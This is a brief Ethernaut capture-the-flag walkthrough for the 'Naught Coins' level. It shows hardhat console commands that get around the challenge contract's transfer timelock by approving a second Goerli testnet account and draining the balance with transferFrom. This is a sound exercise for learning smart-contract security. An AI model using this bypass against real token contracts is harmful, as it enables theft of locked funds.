# Naught Coins

[Naught Coins](https://ethernaut.openzeppelin.com/level/0x36E92B2751F260D6a4749d7CA58247E7f8198284)

Contract address: <BR />
``0x8060CEbcc7f456df5e43ca89B0c574fd61c8Bf55``

<BR />

## Live Attack

```BASH
npx hardhat compile
npx hardhat console --network goerli
```

```JS
accounts = await ethers.getSigners()
accounts[0].address

// Connect to Token contract on-chain
TokenFactory = await ethers.getContractFactory("NaughtCoin")
token = await TokenFactory.attach("0x8060CEbcc7f456df5e43ca89B0c574fd61c8Bf55")

(await token.balanceOf(accounts[0].address)).toString()
all = await token.balanceOf(accounts[0].address)

// Allow other account to transfer our tokens
await token.connect(accounts[0]).approve(accounts[1].address, all)

// Give some Goerli to 2nd Account
valueToSend = ethers.utils.parseEther('0.1')
await accounts[0].sendTransaction({to: accounts[1].address, value: valueToSend})

// Transfer out all balance
await token.connect(accounts[1]).transferFrom(accounts[0].address, accounts[1].address, all)
(await token.balanceOf(accounts[0].address)).toString()
(await token.balanceOf(accounts[1].address)).toString()
```